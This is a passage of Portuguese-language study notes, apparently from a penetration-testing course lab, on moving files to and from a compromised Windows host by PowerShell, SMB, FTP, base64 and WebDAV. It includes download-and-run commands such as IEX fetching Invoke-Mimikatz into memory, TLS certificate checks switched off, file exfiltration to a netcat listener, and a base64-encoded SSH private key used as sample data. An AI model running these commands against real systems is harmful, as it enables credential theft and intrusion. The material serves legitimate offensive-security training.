## Introdução

O windows evoluiu muito esses anos, junto com essa evolução foi criado novos métodos de transferência de arquivos.
Os invasores podem usar vários métodos de transferência de arquivos para operar e evitar serem pegos. Os defensores podem aprender como esses métodos funcionam para monitorar e criar as políticas correspondentes para evitar serem comprometidos. Vamos usar a postagem do blog [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) como um exemplo de uma ameaça persistente avançada (APT).

O post do blog começa falando sobre [ameaças sem arquivo](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/) . O termo `fileless`sugere que uma ameaça não vem em um arquivo, elas usam ferramentas legítimas incorporadas em um sistema para executar um ataque. Isso não significa que não haja uma operação de transferência de arquivo

Conforme discutido mais adiante nesta seção, o arquivo não está "presente" no sistema, mas é executado na memória.

Geralmente, eles `Astaroth attack`seguiam estas etapas: Um link malicioso em um e-mail de spear-phishing levava a um arquivo LNK. Quando clicado duas vezes, o arquivo LNK causava a execução da [ferramenta WMIC](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) com o parâmetro "/Format", o que permitia o download e a execução de código JavaScript malicioso. O código JavaScript, por sua vez, baixava payloads abusando da [ferramenta Bitsadmin](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool) .

Todos os payloads foram codificados em base64 e decodificados usando a ferramenta Certutil, resultando em alguns arquivos DLL. A ferramenta [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) foi então usada para carregar um dos DLLs decodificados, que descriptografou e carregou outros arquivos até que o payload final, Astaroth, fosse injetado no `Userinit`processo. Abaixo está uma representação gráfica do ataque.

![[Pasted image 20240823090844.png]]

### Operações de download
Temos acesso à máquina `MS02`e precisamos baixar um arquivo da nossa `Pwnbox`máquina. Vamos ver como podemos fazer isso usando vários métodos de Download de Arquivo.

![[Pasted image 20240823091521.png]]

## Codificação e decodificação PowerShell Base64

Dependendo do tamanho do arquivo que queremos transferir, podemos usar métodos diferentes que não exigem comunicação de rede. Se tivermos acesso a um terminal, podemos codificar um arquivo para uma string base64, copiar seu conteúdo do terminal e executar a operação reversa, decodificando o arquivo no conteúdo original.

Um passo essencial no uso deste método é garantir que o arquivo que você codifica e decodifica esteja correto. Podemos usar [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html) , um programa que calcula e verifica somas de verificação MD5 de 128 bits. O hash MD5 funciona como uma impressão digital compacta de um arquivo, o que significa que um arquivo deve ter o mesmo hash MD5 em todos os lugares.

#### Pwnbox Verificar Chave SSH Hash MD5
```shell-session
NycolasES6@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Podemos copiar esse conteúdo e colá-lo em um terminal do Windows PowerShell e usar algumas funções do PowerShell para decodificá-lo.

```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

Por fim, podemos confirmar se o arquivo foi transferido com sucesso usando o cmdlet [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) , que faz a mesma coisa que `md5sum`.

#### Confirmando a correspondência de hashes MD5
```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

> [!NOTE] Nota: Embora esse método seja conveniente, nem sempre é possível usá-lo. O utilitário de linha de comando do Windows (cmd.exe) tem um comprimento máximo de string de 8.191 caracteres. Além disso, um shell da web pode dar erro se você tentar enviar strings extremamente grandes.

## Downloads da Web do PowerShell
A maioria das empresas permite HTTPtráfego HTTPSde saída pelo firewall para permitir a produtividade dos funcionários. Aproveitar esses métodos de transporte para operações de transferência de arquivos é muito conveniente. 

O PowerShell oferece muitas opções de transferência de arquivos. Em qualquer versão do PowerShell, a classe System.Net.WebClientHTTP pode ser usada para baixar um arquivo por , HTTPSou FTP. A tabela a seguir descreve os métodos do WebClient para baixar dados de um recurso:

| **Método**                                                                                                               | **Descrição**                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Retorna os dados de um recurso como um [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0) . |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Retorna os dados de um recurso sem bloquear o thread de chamada.                                                             |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Baixa dados de um recurso e retorna uma matriz de bytes.                                                                     |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Baixa dados de um recurso e retorna uma matriz de bytes sem bloquear o thread de chamada.                                    |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Baixa dados de um recurso para um arquivo local.                                                                             |
| [BaixarArquivoAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)    | Baixa dados de um recurso para um arquivo local sem bloquear o thread de chamada.                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)        | Baixa uma String de um recurso e retorna uma String.                                                                         |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Baixa uma String de um recurso sem bloquear o thread de chamada.                                                             |

Vamos explorar alguns exemplos desses métodos para baixar arquivos usando o PowerShell.

#### Método DownloadFile do PowerShell
Podemos especificar o nome da classe `Net.WebClient`e o método `DownloadFile`com os parâmetros correspondentes à URL do arquivo de destino para download e o nome do arquivo de saída.

#### Download de arquivo
```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

#### PowerShell DownloadString - Método sem arquivo
Como discutimos anteriormente, os ataques sem arquivo funcionam usando algumas funções do sistema operacional para baixar o payload e executá-lo diretamente. O PowerShell também pode ser usado para executar ataques sem arquivo. Em vez de baixar um script do PowerShell para o disco, podemos executá-lo diretamente na memória usando o cmdlet [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) ou o alias `IEX`.

```powershell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX`também aceita entrada de pipeline.
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### Invoke-WebRequest do PowerShell
Do PowerShell 3.0 em diante, o cmdlet [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) também está disponível, mas é notavelmente mais lento no download de arquivos. Você pode usar os aliases `iwr`, `curl`, e `wget`em vez do `Invoke-WebRequest`nome completo.

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y compilou uma extensa lista de berços de download do PowerShell [aqui](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) . Vale a pena se familiarizar com eles e suas nuances, como a falta de consciência de proxy ou tocar em disco (baixar um arquivo no alvo) para selecionar o apropriado para a situação.

#### Erros comuns com o PowerShell
Pode haver casos em que a configuração da primeira inicialização do Internet Explorer não foi concluída, o que impede o download.

![[Pasted image 20240823093144.png]]

Isso pode ser ignorado usando o parâmetro `-UseBasicParsing`.
```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Outro erro nos downloads do PowerShell está relacionado ao canal seguro SSL/TLS se o certificado não for confiável. Podemos ignorar esse erro com o seguinte comando:

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## Downloads para PMEs
O protocolo Server Message Block (protocolo SMB) que roda na porta TCP/445 é comum em redes empresariais onde serviços do Windows estão rodando. Ele permite que aplicativos e usuários transfiram arquivos de e para servidores remotos.

Podemos usar SMB para baixar arquivos do nosso Pwnbox facilmente. Precisamos criar um servidor SMB no nosso Pwnbox com [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) do Impacket e então usar `copy`, `move`, PowerShell `Copy-Item`, ou qualquer outra ferramenta que permita conexão ao SMB.

#### Crie o servidor SMB
```shell-session
NycolasES6@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Para baixar um arquivo do servidor SMB para o diretório de trabalho atual, podemos usar o seguinte comando:

#### Copiar um arquivo do servidor SMB
```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

Novas versões do Windows bloqueiam o acesso de convidados não autenticados, como podemos ver no comando a seguir:

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

Para transferir arquivos neste cenário, podemos definir um nome de usuário e uma senha usando nosso servidor Impacket SMB e montar o servidor SMB em nossa máquina de destino Windows:

#### Crie o servidor SMB com um nome de usuário e senha
```shell-session
NycolasES6@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Monte o servidor SMB com nome de usuário e senha
```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

>[!NOTE] **Observação:** você também pode montar o servidor SMB se receber um erro ao usar `copy filename \\IP\sharename`.

## Downloads de FTP
Outra maneira de transferir arquivos é usando FTP (File Transfer Protocol), que usa a porta TCP/21 e TCP/20. Podemos usar o cliente FTP ou PowerShell Net.WebClient para baixar arquivos de um servidor FTP.

Podemos configurar um Servidor FTP em nosso host de ataque usando `pyftpdlib`o módulo Python3. Ele pode ser instalado com o seguinte comando:

#### Instalando o módulo Python3 do servidor FTP - pyftpdlib

```shell-session
NycolasES6@htb[/htb]$ sudo pip3 install pyftpdlib
```

Então podemos especificar a porta número 21 porque, por padrão, `pyftpdlib`usa a porta 2121. A autenticação anônima é habilitada por padrão se não definirmos um usuário e uma senha.

#### Configurando um servidor FTP Python3
```shell-session
NycolasES6@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

Após a configuração do servidor FTP, podemos realizar transferências de arquivos usando o cliente FTP pré-instalado do Windows ou do PowerShell `Net.WebClient`.

#### Transferindo arquivos de um servidor FTP usando o PowerShell

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Quando obtemos um shell em uma máquina remota, podemos não ter um shell interativo. Se esse for o caso, podemos criar um arquivo de comando FTP para baixar um arquivo. Primeiro, precisamos criar um arquivo contendo os comandos que queremos executar e, em seguida, usar o cliente FTP para usar esse arquivo para baixar esse arquivo.

#### Crie um arquivo de comando para o cliente FTP e baixe o arquivo de destino
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## Operações de upload
Há também situações como quebra de senha, análise, exfiltração, etc., onde precisamos carregar arquivos da nossa máquina alvo para o nosso host de ataque. Podemos usar os mesmos métodos que usamos para a operação de download, mas agora para uploads. Vamos ver como podemos realizar o upload de arquivos de várias maneiras.

## Codificação e decodificação PowerShell Base64
Vimos como decodificar uma string base64 usando o Powershell. Agora, vamos fazer a operação reversa e codificar um arquivo para que possamos decodificá-lo em nosso host de ataque.

#### Codificar arquivo usando o PowerShell
```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

Copiamos esse conteúdo e colamos em nosso host de ataque, usamos o `base64`comando para decodificá-lo e usamos o `md5sum`aplicativo para confirmar se a transferência ocorreu corretamente.

#### Decodificar string Base64 no Linux
```shell-session
NycolasES6@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

```shell-session
NycolasES6@htb[/htb]$ md5sum hosts

3688374325b992def12793500307566d  hosts
```

## Carregamentos da Web do PowerShell
O PowerShell não tem uma função interna para operações de upload, mas podemos usar `Invoke-WebRequest`ou `Invoke-RestMethod`para construir nossa função de upload. Também precisaremos de um servidor web que aceite uploads, o que não é uma opção padrão na maioria dos utilitários comuns de servidor web.

Para nosso servidor web, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver) , um módulo estendido do [módulo HTTP.server](https://docs.python.org/3/library/http.server.html) do Python , que inclui uma página de upload de arquivo. Vamos instalá-lo e iniciar o servidor web.

#### Instalando um WebServer Configurado com Upload
```shell-session
NycolasES6@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

```shell-session
NycolasES6@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Agora podemos usar um script do PowerShell [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) que usa `Invoke-RestMethod`para executar as operações de upload. O script aceita dois parâmetros `-File`, que usamos para especificar o caminho do arquivo, e `-Uri`, a URL do servidor onde faremos upload do nosso arquivo. Vamos tentar fazer upload do arquivo host do nosso host Windows.

#### Script do PowerShell para carregar um arquivo no servidor de upload do Python
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### Carregamento da Web do PowerShell Base64
Outra maneira de usar o PowerShell e arquivos codificados em base64 para operações de upload é usando `Invoke-WebRequest`ou `Invoke-RestMethod`junto com o Netcat. Usamos o Netcat para escutar em uma porta que especificamos e enviamos o arquivo como uma `POST`solicitação. Por fim, copiamos a saída e usamos a função de decodificação base64 para converter a string base64 em um arquivo.

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Capturamos os dados base64 com o Netcat e usamos o aplicativo base64 com a opção decode para converter a string no arquivo.

```shell-session
NycolasES6@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```

```shell-session
NycolasES6@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

## Carregamentos de PMEs

Anteriormente, discutimos que as empresas geralmente permitem tráfego de saída usando os protocolos `HTTP`(TCP/80) e `HTTPS`(TCP/443). Normalmente, as empresas não permitem o protocolo SMB (TCP/445) fora de sua rede interna porque isso pode deixá-las expostas a ataques em potencial. Para obter mais informações sobre isso, podemos ler a postagem da Microsoft [Preventing SMB traffic from lateral connections and entering or leaving the network (Prevenindo o tráfego SMB de conexões laterais e entrando ou saindo da rede)](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a) .

Uma alternativa é executar SMB sobre HTTP com `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) é uma extensão do HTTP, o protocolo de internet que navegadores e servidores web usam para se comunicar entre si. O `WebDAV`protocolo permite que um servidor web se comporte como um servidor de arquivos, suportando criação colaborativa de conteúdo. `WebDAV`também pode usar HTTPS.

Quando você usa `SMB`, ele primeiro tentará se conectar usando o protocolo SMB e, se não houver um compartilhamento SMB disponível, ele tentará se conectar usando HTTP. Na captura do Wireshark a seguir, tentamos nos conectar ao compartilhamento de arquivos `testing3`e, como ele não encontrou nada com `SMB`, ele usa `HTTP`.

![[Pasted image 20240823094736.png]]

#### Configurando o servidor WebDav
Para configurar nosso servidor WebDav, precisamos instalar dois módulos Python `wsgidav`e `cheroot`(você pode ler mais sobre essa implementação aqui: [wsgidav github](https://github.com/mar10/wsgidav) ). Após instalá-los, executamos o `wsgidav`aplicativo no diretório de destino.

#### Instalando módulos Python do WebDav
```shell-session
NycolasES6@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

#### Usando o módulo Python WebDav
```shell-session
NycolasES6@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
